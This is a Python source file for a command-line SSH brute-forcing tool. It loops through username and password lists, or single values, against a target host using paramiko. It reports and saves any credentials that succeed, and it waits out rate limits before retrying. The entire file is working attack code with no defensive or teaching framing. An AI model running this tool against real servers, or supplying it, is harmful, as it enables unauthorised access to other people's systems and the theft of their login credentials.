import paramiko
import socket
import time
import argparse
from colorama import init, Fore
import sys

init()

GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE

def is_ssh_open(hostname, username, password, port):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, port=port, timeout=3)
    except socket.gaierror:
        print(f"{RED}[!] Invalid hostname or IP address: {hostname}{RESET}")
        return "invalid_host"
    except socket.timeout:
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        return False
    except paramiko.SSHException:
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        time.sleep(60)
        return is_ssh_open(hostname, username, password, port)
    else:
        print(f"{GREEN}[+] Found valid credentials:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True
    finally:
        client.close()



def brute_force_ssh(host, port, usernames, passwords, output_file=None):
    try:
        for username in usernames:
            for password in passwords:
                print(f"[!] Trying username: '{username}' with password: '{password}'")
                result = is_ssh_open(host, username, password, port)
                if result == "invalid_host":
                    print(f"{RED}[!] Stopping brute force due to invalid hostname or IP.{RESET}")
                    sys.exit(1)
                elif result: 
                    if output_file:
                        with open(output_file, "a") as creds_file:
                            creds_file.write(f"HOSTNAME: {host}\tUSERNAME: {username}\tPASSWORD: {password}\n")
                    return 
    except KeyboardInterrupt:
        print(f"{RED}\n[!] Process interrupted by user. Exiting...{RESET}")
        sys.exit(0)
    return


def ssh_bruteforce_main(args=None):
    parser = argparse.ArgumentParser(description="SSH brute-forcing tool")
    parser.add_argument("-host", "--host", required=True, help="Hostname or IP of SSH server")
    parser.add_argument("-port", "--port", type=int, default=22, help="SSH server port (default: 22)")
    parser.add_argument("-u", "--user", help="Single username to try")
    parser.add_argument("-U", "--usernames", help="File of usernames, each on a new line")
    parser.add_argument("-p", "--password", help="Single password to try")
    parser.add_argument("-P", "--passlist", help="File of passwords, each on a new line")
    parser.add_argument("-o", "--output", help="Output file for successful credentials")

    args = parser.parse_args(args)
    host, port = args.host, args.port
    output_file = args.output

    usernames = [args.user] if args.user else open(args.usernames).read().splitlines() if args.usernames else None
    passwords = [args.password] if args.password else open(args.passlist).read().splitlines() if args.passlist else None

    if not usernames:
        print("Error: Provide username with -u or -U.")
        sys.exit(1)
    if not passwords:
        print("Error: Provide password with -p or -P.")
        sys.exit(1)

    brute_force_ssh(host, port, usernames, passwords, output_file)

if __name__ == "__main__":
    ssh_bruteforce_main()
